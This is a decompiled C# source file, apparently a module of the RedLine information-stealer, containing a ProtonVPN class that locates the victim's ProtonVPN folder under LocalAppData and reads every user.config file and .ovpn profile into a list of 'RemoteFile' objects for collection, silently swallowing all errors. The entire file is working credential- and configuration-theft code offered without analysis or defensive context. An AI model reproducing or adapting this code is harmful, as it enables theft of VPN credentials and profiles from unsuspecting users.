using System;
using System.Collections.Generic;
using System.IO;
using RedLine.Logic.Helpers;
using RedLine.Models;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x02000040 RID: 64
	public static class ProtonVPN
	{
		// Token: 0x0600019D RID: 413 RVA: 0x000057C0 File Offset: 0x000039C0
		public static List<RemoteFile> ParseFiles()
		{
			List<RemoteFile> list = new List<RemoteFile>();
			try
			{
				string path = Path.Combine(Constants.LocalAppData, "ProtonVPN");
				if (!Directory.Exists(path))
				{
					return list;
				}
				try
				{
					foreach (string text in Directory.GetDirectories(path))
					{
						if (text.Contains("ProtonVPN.exe"))
						{
							string[] directories = Directory.GetDirectories(text);
							for (int j = 0; j < directories.Length; j++)
							{
								string path2 = directories[j] + "\\user.config";
								string name = new DirectoryInfo(Path.GetDirectoryName(path2)).Name;
								list.Add(new RemoteFile
								{
									Body = File.ReadAllBytes(path2),
									FileName = "user.config",
									FileDirectory = name
								});
							}
						}
					}
					foreach (string path3 in Directory.GetFiles(path))
					{
						if (Path.GetExtension(path3).Contains("ovpn"))
						{
							list.Add(new RemoteFile
							{
								Body = File.ReadAllBytes(path3),
								FileName = Path.GetFileName(path3)
							});
						}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
